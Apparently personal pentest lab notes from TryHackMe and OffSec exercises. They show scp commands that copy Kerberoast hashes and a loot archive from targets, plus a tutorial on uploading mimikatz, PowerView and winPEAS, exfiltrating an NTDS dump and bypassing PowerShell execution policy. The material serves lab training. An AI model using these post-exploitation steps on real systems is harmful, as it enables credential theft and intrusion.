```
scp hashes.kerberoast kali@192.168.45.159:/home/kali/offsec/shiyan/shiyan4
```

```
scp Administrator@10.80.177.16:Downloads/20260120011224_loot.zip /home/noah/thm/Post-Exploitation-Basics
```
```
scp Administrator@10.80.177.16:/C:/Users/Administrator/Downloads/20260120011224_loot.zip /home/noah/thm/Post-Exploitation-Basics
```


In the context of your pentest, if you have SSH access to a machine (like the one where you found the `sshd` user), `scp` (Secure Copy) is a reliable way to move tools or exfiltrate data.

Here is how you use it:

### 1. Transfer a file FROM your machine TO the target

Use this to upload tools like `mimikatz.exe`, `PowerView.ps1`, or `winPEAS.exe`.

Bash

```
scp /path/to/local/file.exe username@10.80.177.16:C:\Users\Public\
```

### 2. Transfer a file FROM the target TO your machine

Use this to download sensitive files, like the NTDS dump or a specific configuration file.

Bash

```
scp username@10.80.177.16:C:\Users\Administrator\Documents\secrets.txt ./local_folder/
```

---

### Key Syntax Breakdown

The basic structure of an `scp` command is: `scp <source> <destination>`

- **Remote Path Format:** `user@host:path`
    
- **Recursive (Folders):** Use `-r` to copy an entire directory.
    
- **Custom Port:** If SSH is running on a non-standard port (not 22), use `-P <port>`.
    

---

### Tips for Pentesters

- **The Public Folder:** On Windows targets, `C:\Users\Public\` is often a safe place to upload files because it usually has less restrictive permissions.
    
- **Bypassing Execution Policy:** If you upload `PowerView.ps1` and want to run it, remember to bypass the policy:
    
    PowerShell
    
    ```
    powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
    ```
    
- **SSH Key:** If you have an SSH private key (`id_rsa`) instead of a password, use the `-i` flag:
    
    Bash
    
    ```
    scp -i id_rsa tool.exe user@10.80.177.16:C:\Temp\
    ```
    

### Using SCP within PowerShell

Since you are using `pwsh`, Windows 10/11 and Windows Server 2019+ have `scp.exe` built-in. You can run it directly from your PowerShell prompt just like you do in Linux.
